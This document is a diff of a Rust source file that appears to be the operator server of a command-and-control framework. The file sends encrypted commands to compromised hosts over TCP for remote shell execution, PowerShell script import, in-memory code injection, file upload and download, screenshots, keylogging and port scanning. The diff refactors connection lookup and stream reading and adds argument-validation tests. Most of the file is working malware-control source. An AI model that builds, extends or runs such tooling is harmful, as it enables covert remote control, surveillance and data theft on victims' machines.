@@ -16,7 +16,6 @@ pub struct ConnectionInfo {
     pub id: usize,
     pub stream: Arc<Mutex<TcpStream>>,
     pub hostname: String,
-    pub is_pivot: bool,
     pub username: String,
     pub os: String,
     pub shared_secret: [u8; 32],
@@ -36,7 +35,7 @@ pub async fn handle_importpsh(
         Err(_) => return Err("Invalid ID".to_string()),
     };
     let script_name = parts[2].trim();
-    if id > active_connections.lock().await.len() {
+    if !active_connections.lock().await.values().any(|v| v.id == id) {
         return Err("Invalid ID".to_string());
     }
     let script_file = match File::open(script_name) {
@@ -45,16 +44,18 @@ pub async fn handle_importpsh(
     };
     let mut reader = BufReader::new(script_file);
     let mut buffer = Vec::new();
-    let active_connections = active_connections.lock().await;
     reader.read_to_end(&mut buffer).unwrap();
     let encoded_script = general_purpose::STANDARD.encode(&buffer);
 
     let import_cmd = b"||IMPORTSCRIPT|| ";
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let active_connections = active_connections.lock().await;
+    let connection_info = match active_connections.values().find(|v| v.id == id) {
+        Some(c) => c,
+        None => return Err("Invalid ID".to_string()),
+    };
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let encrypted_cmd = encrypt(import_cmd, &shared_secret).unwrap();
-    let combined_command = encoded_script;
 
     stream
         .lock()
@@ -62,7 +63,7 @@ pub async fn handle_importpsh(
         .write(&encrypted_cmd)
         .await
         .expect("Error writing to stream");
-    for chunk in combined_command.as_bytes().chunks(956) {
+    for chunk in encoded_script.as_bytes().chunks(956) {
         let encrypted_command = encrypt(chunk, &shared_secret).expect("Failed to encrypt");
         stream
             .lock()
@@ -117,10 +118,10 @@ pub async fn handle_run_script(
     let function_name = parts[2].trim().to_string();
     let active_connections = active_connections.lock().await;
 
-    if id > active_connections.len() {
+    if !active_connections.values().any(|v| v.id == id) {
         return Err("Invalid ID".to_string());
     }
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let command = format!("||RUNSCRIPT|| {}", function_name);
@@ -151,6 +152,7 @@ pub async fn handle_run_script(
     cmdout = cmdout.replace("||cmd||", "");
     Ok(cmdout.trim().to_string())
 }
+
 pub async fn handle_in_memory(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
     command: &str,
@@ -159,7 +161,7 @@ pub async fn handle_in_memory(
     if parts.len() < 3 {
         return Err(format!(
             "Invalid command, expected '{} ID command'",
-            parts[1]
+            parts[0]
         ));
     }
     let id: usize = match parts[1].trim().parse() {
@@ -167,16 +169,17 @@ pub async fn handle_in_memory(
         Err(_) => return Err("Invalid ID".to_string()),
     };
     let path = parts[2].trim().to_string();
-    let mut args_export = String::from("");
-    if parts.len() == 4 {
-        args_export = parts[3].trim().to_string()
-    }
+    let args_export = if parts.len() == 4 {
+        parts[3].trim().to_string()
+    } else {
+        String::new()
+    };
     let active_connections = active_connections.lock().await;
 
-    if id > active_connections.len() {
+    if !active_connections.values().any(|v| v.id == id) {
         return Err("Invalid ID".to_string());
     }
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let command = format!("||INJECT|| {} {}", path, args_export);
@@ -205,6 +208,7 @@ pub async fn handle_in_memory(
     let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
     Ok(String::from_utf8(data).unwrap())
 }
+
 pub async fn parse_client_info(
     stream: &mut Arc<Mutex<tokio::net::TcpStream>>,
 ) -> (String, String, SharedSecret) {
@@ -218,7 +222,6 @@ pub async fn parse_client_info(
     let mut buffer = [0; 32];
 
     tcp_stream.write(&public_bytes).await.unwrap();
-    // set timeout of 1s for reading the public key from the client
     let result = timeout(Duration::from_secs(1), tcp_stream.read(&mut buffer)).await;
     match result {
         Ok(Ok(_)) => {}
@@ -251,9 +254,10 @@ pub async fn parse_client_info(
         }
     }
 }
+
 pub async fn handle_command(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
-    command: &str
+    command: &str,
 ) -> Result<String, String> {
     let parts: Vec<&str> = command.splitn(3, ' ').collect();
     if parts.len() < 3 {
@@ -272,7 +276,7 @@ pub async fn handle_command(
     if !active_connections.values().any(|value| value.id == id) {
         return Err("Invalid ID".to_string());
     }
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let command_prefix = if command.starts_with("psh") {
@@ -296,20 +300,19 @@ pub async fn handle_command(
         .await
         .expect("Error flushing stream");
     let mut cmdout = String::new();
-    let mut buffer = [0; 65536];
-    stream
-        .lock()
-        .await
-        .read(&mut buffer)
-        .await
-        .expect("Error reading from stream");
-    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
     while !cmdout.contains("||cmd||") {
-        cmdout.push_str(&String::from_utf8(data.to_vec()).unwrap());
+        let mut buffer = [0; 65536];
+        let _ = match stream.lock().await.read(&mut buffer).await {
+            Ok(n) => n,
+            Err(_) => break,
+        };
+        let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
+        cmdout.push_str(&String::from_utf8(data).unwrap());
     }
     cmdout = cmdout.replace("||cmd||", "");
     Ok(cmdout.trim().to_string())
 }
+
 pub async fn handle_list(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
 ) -> String {
@@ -342,19 +345,14 @@ pub async fn handle_list(
 
     for c in rows {
         let id_col = format!("{:<3}", c.id);
-        let host_col = format!(
-            "{}{:<pad$}",
-            if c.is_pivot { "PIVOT " } else { "" },
-            c.hostname,
-            pad = host_w.saturating_sub(if c.is_pivot { 6 } else { 0 })
-        );
+        let host_col = format!("{:<host_w$}", c.hostname);
         let user_col = format!("{:<user_w$}", c.username);
         let os_col = format!("{:<os_w$}", c.os);
 
         out.push_str(&format!(
             " {}  {}  {}  {}  {}\n",
             id_col.cyan().bold(),
-            if c.is_pivot { host_col.yellow().to_string() } else { host_col },
+            host_col,
             user_col.green(),
             os_col,
             c.connected_at.dimmed(),
@@ -362,9 +360,10 @@ pub async fn handle_list(
     }
     out
 }
+
 pub async fn handle_upload(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
-    command: &str
+    command: &str,
 ) -> Result<String, String> {
     let parts: Vec<&str> = command.split(" ").collect();
     if parts.len() < 4 {
@@ -389,7 +388,7 @@ pub async fn handle_upload(
     reader.read_to_end(&mut buffer).unwrap();
     let encoded_file = general_purpose::STANDARD.encode(&buffer);
     let upload_cmd = "||UPLOAD|| ".to_owned() + &destination;
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let upload_cmd = encrypt(upload_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
@@ -417,17 +416,19 @@ pub async fn handle_upload(
         .flush()
         .await
         .expect("Error flushing stream");
-    let _ = match stream.lock().await.read(&mut buffer).await {
+    let mut response_buf = [0; 1024];
+    let _ = match stream.lock().await.read(&mut response_buf).await {
         Ok(n) => n,
         Err(_) => return Err("Error reading from stream".to_string()),
     };
-    let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
+    let data = decrypt(&response_buf, &shared_secret).expect("Failed to decrypt");
     let response = match String::from_utf8(data) {
         Ok(response) => response,
         Err(_) => return Err("Error converting response to string".to_string()),
     };
     Ok(response)
 }
+
 pub async fn handle_download(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
     command: &str,
@@ -447,7 +448,7 @@ pub async fn handle_download(
         return Err("Invalid ID".to_string());
     }
     let download_cmd = "||DOWNLOAD|| ".to_owned() + &download_input;
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let download_cmd = encrypt(download_cmd.as_bytes(), &shared_secret).expect("Failed to encrypt");
@@ -511,7 +512,7 @@ pub async fn handle_screenshot(
         return Err("Invalid ID".to_string());
     }
     let screenshot_cmd = "||SCREENSHOT|| ".to_owned();
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let screenshot_cmd =
@@ -556,7 +557,7 @@ pub async fn handle_keylogger(
         return Err("Invalid ID".to_string());
     }
     let keylogger_cmd = "||KEYLOGGER|| ".to_owned() + state;
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let keylogger_cmd =
@@ -634,9 +635,7 @@ pub async fn handle_port_scan(
     }
     let id: usize = match parts[1].trim().parse() {
         Ok(num) => num,
-        Err(_) => {
-            return Err("Invalid ID".to_string());
-        }
+        Err(_) => return Err("Invalid ID".to_string()),
     };
     let active_connections = active_connections.lock().await;
     if !active_connections.values().any(|value| value.id == id) {
@@ -646,7 +645,7 @@ pub async fn handle_port_scan(
     let num1 = parts[3];
     let num2 = parts[4];
     let port_scan_cmd = "||SCAN|| ".to_owned() + ip + " " + &num1 + " " + &num2;
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let port_scan_cmd =
@@ -673,36 +672,29 @@ pub async fn handle_port_scan(
     let formatted_response = ports.join(", ");
     Ok(format!("IP {} has port {} open", ip, formatted_response))
 }
+
 pub async fn handle_kill(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
     command: &str,
 ) -> Result<String, String> {
     let parts: Vec<&str> = command.split(" ").collect();
-    let id: usize = match parts[1].trim().parse() {
-        Ok(num) => num,
-        Err(_) => {
-            return Err("Invalid ID".to_string());
-        }
-    };
     if parts.len() < 2 {
         return Err("Invalid command, expected 'kill ID'".to_string());
     }
+    let id: usize = match parts[1].trim().parse() {
+        Ok(num) => num,
+        Err(_) => return Err("Invalid ID".to_string()),
+    };
 
-    if !active_connections
-        .lock()
-        .await
-        .values()
-        .any(|value| value.id == id)
-    {
+    let active_connections = active_connections.lock().await;
+    if !active_connections.values().any(|value| value.id == id) {
         return Err("Invalid ID".to_string());
     }
 
-    let active_connections = active_connections.lock().await;
-    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let connection_info = active_connections.values().find(|v| v.id == id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
 
-    
     let cmd = encrypt(b"||EXIT||", &shared_secret).expect("Failed to encrypt");
     stream
         .lock()
@@ -718,7 +710,253 @@ pub async fn handle_kill(
         .expect("Error flushing stream");
     Ok(format!("Kill command sent to {}.", id))
 }
+
 pub fn handle_exit() {
     println!("\nExiting");
     std::process::exit(0);
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::collections::HashMap;
+
+    fn empty_map() -> Arc<Mutex<HashMap<String, ConnectionInfo>>> {
+        Arc::new(Mutex::new(HashMap::new()))
+    }
+
+    async fn make_connection(id: usize, hostname: &str) -> ConnectionInfo {
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        let stream = tokio::net::TcpStream::connect(addr).await.unwrap();
+        let _ = listener.accept().await.unwrap();
+        ConnectionInfo {
+            id,
+            stream: Arc::new(Mutex::new(stream)),
+            hostname: hostname.to_string(),
+            username: "testuser".to_string(),
+            os: "linux".to_string(),
+            shared_secret: [0u8; 32],
+            connected_at: "2024-01-01".to_string(),
+        }
+    }
+
+    // handle_list
+
+    #[tokio::test]
+    async fn list_empty_connections() {
+        let result = handle_list(&empty_map()).await;
+        assert!(result.contains("No active connections"));
+    }
+
+    #[tokio::test]
+    async fn list_shows_connection_details() {
+        let map = empty_map();
+        let conn = make_connection(0, "192.168.1.1").await;
+        map.lock().await.insert("192.168.1.1".to_string(), conn);
+        let result = handle_list(&map).await;
+        assert!(result.contains("192.168.1.1"));
+        assert!(result.contains("testuser"));
+        assert!(result.contains("linux"));
+    }
+
+    // handle_command
+
+    #[tokio::test]
+    async fn command_too_few_args() {
+        let result = handle_command(&empty_map(), "cmd 0").await;
+        assert!(result.unwrap_err().contains("Invalid command"));
+    }
+
+    #[tokio::test]
+    async fn command_non_numeric_id() {
+        let result = handle_command(&empty_map(), "cmd abc whoami").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    #[tokio::test]
+    async fn command_unknown_id() {
+        let result = handle_command(&empty_map(), "cmd 0 whoami").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    // handle_upload
+
+    #[tokio::test]
+    async fn upload_too_few_args() {
+        let result = handle_upload(&empty_map(), "upload 0 file").await;
+        assert!(result.unwrap_err().contains("Invalid command"));
+    }
+
+    #[tokio::test]
+    async fn upload_non_numeric_id() {
+        let result = handle_upload(&empty_map(), "upload abc file dest").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    #[tokio::test]
+    async fn upload_unknown_id() {
+        let result = handle_upload(&empty_map(), "upload 0 file dest").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    // handle_download
+
+    #[tokio::test]
+    async fn download_too_few_args() {
+        let result = handle_download(&empty_map(), "download 0 file").await;
+        assert!(result.unwrap_err().contains("Invalid command"));
+    }
+
+    #[tokio::test]
+    async fn download_non_numeric_id() {
+        let result = handle_download(&empty_map(), "download abc file dest").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    #[tokio::test]
+    async fn download_unknown_id() {
+        let result = handle_download(&empty_map(), "download 0 file dest").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    // handle_screenshot
+
+    #[tokio::test]
+    async fn screenshot_too_few_args() {
+        let result = handle_screenshot(&empty_map(), "screenshot").await;
+        assert!(result.unwrap_err().contains("Invalid command"));
+    }
+
+    #[tokio::test]
+    async fn screenshot_non_numeric_id() {
+        let result = handle_screenshot(&empty_map(), "screenshot abc").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    #[tokio::test]
+    async fn screenshot_unknown_id() {
+        let result = handle_screenshot(&empty_map(), "screenshot 0").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    // handle_keylogger
+
+    #[tokio::test]
+    async fn keylogger_too_few_args() {
+        let result = handle_keylogger(&empty_map(), "keylogger 0").await;
+        assert!(result.unwrap_err().contains("Invalid command"));
+    }
+
+    #[tokio::test]
+    async fn keylogger_invalid_state() {
+        let result = handle_keylogger(&empty_map(), "keylogger 0 maybe").await;
+        assert!(result.unwrap_err().contains("Invalid state"));
+    }
+
+    #[tokio::test]
+    async fn keylogger_non_numeric_id() {
+        let result = handle_keylogger(&empty_map(), "keylogger abc on").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    #[tokio::test]
+    async fn keylogger_unknown_id_on() {
+        let result = handle_keylogger(&empty_map(), "keylogger 0 on").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    // handle_port_scan
+
+    #[tokio::test]
+    async fn port_scan_too_few_args() {
+        let result = handle_port_scan(&empty_map(), "portscan 0 127.0.0.1 1").await;
+        assert!(result.unwrap_err().contains("Invalid command"));
+    }
+
+    #[tokio::test]
+    async fn port_scan_non_numeric_id() {
+        let result = handle_port_scan(&empty_map(), "portscan abc 127.0.0.1 1 100").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    #[tokio::test]
+    async fn port_scan_unknown_id() {
+        let result = handle_port_scan(&empty_map(), "portscan 0 127.0.0.1 1 100").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    // handle_kill
+
+    #[tokio::test]
+    async fn kill_non_numeric_id() {
+        let result = handle_kill(&empty_map(), "kill abc").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    #[tokio::test]
+    async fn kill_unknown_id() {
+        let result = handle_kill(&empty_map(), "kill 0").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    // handle_importpsh
+
+    #[tokio::test]
+    async fn importpsh_too_few_args() {
+        let result = handle_importpsh(&empty_map(), "import-psh 0").await;
+        assert!(result.unwrap_err().contains("Invalid command"));
+    }
+
+    #[tokio::test]
+    async fn importpsh_non_numeric_id() {
+        let result = handle_importpsh(&empty_map(), "import-psh abc script.ps1").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    #[tokio::test]
+    async fn importpsh_unknown_id() {
+        let result = handle_importpsh(&empty_map(), "import-psh 99 script.ps1").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    // handle_run_script
+
+    #[tokio::test]
+    async fn run_script_too_few_args() {
+        let result = handle_run_script(&empty_map(), "run-psh 0").await;
+        assert!(result.unwrap_err().contains("Invalid command"));
+    }
+
+    #[tokio::test]
+    async fn run_script_non_numeric_id() {
+        let result = handle_run_script(&empty_map(), "run-psh abc func").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    #[tokio::test]
+    async fn run_script_unknown_id() {
+        let result = handle_run_script(&empty_map(), "run-psh 99 func").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    // handle_in_memory
+
+    #[tokio::test]
+    async fn in_memory_too_few_args() {
+        let result = handle_in_memory(&empty_map(), "inject 0").await;
+        assert!(result.unwrap_err().contains("Invalid command"));
+    }
+
+    #[tokio::test]
+    async fn in_memory_non_numeric_id() {
+        let result = handle_in_memory(&empty_map(), "inject abc path").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
+
+    #[tokio::test]
+    async fn in_memory_unknown_id() {
+        let result = handle_in_memory(&empty_map(), "inject 99 path").await;
+        assert_eq!(result.unwrap_err(), "Invalid ID");
+    }
 }
